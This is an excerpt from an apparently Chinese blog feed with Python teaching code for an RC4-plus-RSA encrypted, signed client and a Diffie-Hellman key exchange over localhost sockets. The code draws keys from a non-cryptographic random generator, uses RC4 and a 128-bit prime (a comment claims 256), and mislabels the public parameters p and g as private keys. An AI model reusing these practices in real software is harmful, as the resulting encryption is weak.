keyword">def</span> <span class="token function">rc4_encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    j <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment"># 初始化 S 盒</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token comment"># 生成密钥流并加密明文</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">for</span> char <span class="token keyword">in</span> plaintext<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char <span class="token operator">^</span> S<span class="token punctuation">[</span><span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>server_address <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span></pre></td></tr><tr><td data-num="31"></td><td><pre>server_port <span class="token operator">=</span> <span class="token number">8888</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment"># 生成 RSA 密钥对</span></pre></td></tr><tr><td data-num="34"></td><td><pre>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>private_key <span class="token operator">=</span> key<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#将生成的私钥对象导出为字符串形式的私钥</span></pre></td></tr><tr><td data-num="36"></td><td><pre>public_key <span class="token operator">=</span> key<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#将生成的公钥对象导出为字符串形式的公钥</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">#导出的密钥以字符串形式表示，通常使用 PEM (Privacy-Enhanced Mail) 格式编码。</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment"># 这样，密钥可以被保存、传输和加载到其他程序中进行使用。在代码中，导出的私钥和公钥字符串被打印出来以便查看。</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密密钥:"</span><span class="token punctuation">,</span> private_key<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"公钥:"</span><span class="token punctuation">,</span> public_key<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment"># 连接服务器</span></pre></td></tr><tr><td data-num="43"></td><td><pre>client_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_address<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token comment"># 发送公钥给服务器</span></pre></td></tr><tr><td data-num="47"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"公钥已发送给服务器："</span><span class="token punctuation">,</span> public_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token comment"># 接收服务器的签名公钥</span></pre></td></tr><tr><td data-num="51"></td><td><pre>server_public_key <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"收到服务器的签名公钥:"</span><span class="token punctuation">,</span> server_public_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment"># 导入服务器的签名公钥</span></pre></td></tr><tr><td data-num="55"></td><td><pre>rsa_server_public_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>server_public_key<span class="token punctuation">)</span><span class="token comment">#提取出 n 和 e</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token comment"># 使用服务器的公钥加密 RC4 密钥</span></pre></td></tr><tr><td data-num="58"></td><td><pre>rsa_cipher <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsa_server_public_key<span class="token punctuation">)</span> <span class="token comment">#是一个用于创建 PKCS 密码方案的对象的方法。用于在非对称加密中提供安全性和填充方案。</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment"># 它使用一种随机化机制和填充方式，增加了加密的安全性，并且能够处理较短的明文。</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment"># 该对象可以使用公钥进行加密操作，或使用私钥进行解密操作。</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token comment"># 生成随机 RC4 密钥</span></pre></td></tr><tr><td data-num="62"></td><td><pre>rc4_key <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"生成随机RC4加密密钥:"</span><span class="token punctuation">,</span> rc4_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre>encrypted_rc4_key <span class="token operator">=</span> rsa_cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>rc4_key<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"RC4密钥已用服务器的公钥加密:"</span><span class="token punctuation">,</span> encrypted_rc4_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token comment"># 要发送的消息</span></pre></td></tr><tr><td data-num="69"></td><td><pre>message <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入你要加密的消息:"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token comment"># 加密消息</span></pre></td></tr><tr><td data-num="72"></td><td><pre>encrypted_message <span class="token operator">=</span> rc4_encrypt<span class="token punctuation">(</span>rc4_key<span class="token punctuation">,</span> message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文信息已加密。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token comment"># 使用客户端的私钥对加密后的消息进行签名</span></pre></td></tr><tr><td data-num="76"></td><td><pre>hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>encrypted_message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>signature <span class="token operator">=</span> pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>hash_obj<span class="token punctuation">)</span><span class="token comment">#这部分代码创建了一个 pkcs1_15 对象，它用于对数据进行加密或签名操作。key 是一个 RSA 密钥对象，它包含了公钥或私钥</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"生成数字签名:"</span><span class="token punctuation">,</span> signature<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre></pre></td></tr><tr><td data-num="80"></td><td><pre><span class="token comment"># 将加密的 RC4 密钥和消息发送给服务器</span></pre></td></tr><tr><td data-num="81"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>encrypted_rc4_key <span class="token operator">+</span> encrypted_message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密RC4密钥和加密信息已发送给服务器。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre><span class="token comment"># 将签名发送给服务器</span></pre></td></tr><tr><td data-num="85"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>signature<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数字签名已发送给服务器。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre><span class="token comment"># 关闭客户端连接</span></pre></td></tr><tr><td data-num="89"></td><td><pre>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DH协议</title>
      <link href="/2023/07/24/DH%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/07/24/DH%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器端"><a class="markdownIt-Anchor" href="#服务器端">#</a> 服务器端</h1><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> mpz</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> sympy <span class="token keyword">import</span> primitive_root</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_prime</span><span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token comment"># 调用 getPrime (bits) 函数生成一个素数 p</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token comment"># 将 p 转换为 GMP 的整数类型（mpz）</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        p <span class="token operator">=</span> mpz<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment"># 检查 p 的位长度是否等于指定的位数 bits</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span> p<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> bits<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">return</span> p</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_public_key</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> g<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment"># 计算公钥</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_shared_secret</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> public_key<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment"># 计算共享密钥</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>public_key<span class="token punctuation">,</span> private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment"># 创建 Socket 对象</span></pre></td></tr><tr><td data-num="25"></td><td><pre>server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment"># 绑定主机和端口</span></pre></td></tr><tr><td data-num="28"></td><td><pre>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span></pre></td></tr><tr><td data-num="29"></td><td><pre>port <span class="token operator">=</span> <span class="token number">8000</span></pre></td></tr><tr><td data-num="30"></td><td><pre>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment"># 监听连接</span></pre></td></tr><tr><td data-num="33"></td><td><pre>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"服务器正在监听端口:"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment"># 接受客户端连接</span></pre></td></tr><tr><td data-num="37"></td><td><pre>client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接已建立。客户端地址:"</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment"># 生成 256 位的素数 p 和本原根 g</span></pre></td></tr><tr><td data-num="41"></td><td><pre>p <span class="token operator">=</span> generate_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>g <span class="token operator">=</span> primitive_root<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment"># 生成服务器的私钥</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"服务器的私钥p:"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"服务器的私钥g:"</span><span class="token punctuation">,</span>g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>XB <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token comment"># 生成服务器的公钥</span></pre></td></tr><tr><td data-num="49"></td><td><pre>public_key_server <span class="token operator">=</span> generate_public_key<span class="token punctuation">(</span>p<span class="token punctuation">,</span> g<span class="token punctuation">,</span> XB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token comment"># 将 p 和 g 发送给客户端</span></pre></td></tr><tr><td data-num="52"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment"># 等待客户端发送公钥</span></pre></td></tr><tr><td data-num="56"></td><td><pre>public_key_client <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>public_key_server<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment"># 生成服务器的共享密钥</span></pre></td></tr><tr><td data-num="60"></td><td><pre>shared_secret_server <span class="token operator">=</span> generate_shared_secret<span class="token punctuation">(</span>p<span class="token punctuation">,</span> public_key_client<span class="token punctuation">,</span> XB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment"># 发送服务器的共享密钥给客户端</span></pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token comment"># 关闭连接</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"服务器的共享密钥:"</span><span class="token punctuation">,</span>shared_secret_server<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="客户端"><a class="markdownIt-Anchor" href="#客户端">#</a> 客户端</h1><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_public_key</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> g<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment"># 计算公钥</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_shared_secret</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> public_key<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment"># 计算共享密钥</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>public_key<span class="token punctuation">,</span> private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># 创建 Socket 对象</span></pre></td></tr><tr><td data-num="13"></td><td><pre>client_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># 连接服务器</span></pre></td></tr><tr><td data-num="16"></td><td><pre>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span></pre></td></tr><tr><td data-num="17"></td><td><pre>port <span class="token operator">=</span> <span class="token number">8000</span></pre></td></tr><tr><td data-num="18"></td><td><pre>client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已连接到服务器。主机:"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> <span class="token string">"端口:"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment"># 接收服务器端发送的 p 和 g</span></pre></td></tr><tr><td data-num="22"></td><td><pre>p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>g <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment"># 生成客户端的私钥</span></pre></td></tr><tr><td data-num="26"></td><td><pre>XA <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"客户端的私钥:"</span><span class="token punctuation">,</span>XA<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment"># 生成客户端的公钥</span></pre></td></tr><tr><td data-num="29"></td><td><pre>public_key_client <span class="token operator">=</span> generate_public_key<span class="token punctuation">(</span>p<span class="token punctuation">,</span> g<span class="token punctuation">,</span> XA<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"客户端的公钥:"</span><span class="token punctuation">,</span>public_key_client<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment"># 发送公钥给服务器端</span></pre></td></tr><tr><td data-num="32"></td><td><pre>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>public_key_client<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment"># 接收服务器端发送的共享密钥</span></pre></td></tr><tr><td data-num="35"></td><td><pre>public_key_server<span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># 生成客户端的共享密钥</span></pre></td></tr><tr><td data-num="38"></td><td><pre>shared_secret_client <span class="token operator">=</span> generate_shared_secret<span class="token punctuation">(</span>p<span class="token punctuation">,</span> public_key_server<span class="token punctuation">,</span> XA<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment"># 输出客户端的共享密钥</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token keyword">print</span><span class="token 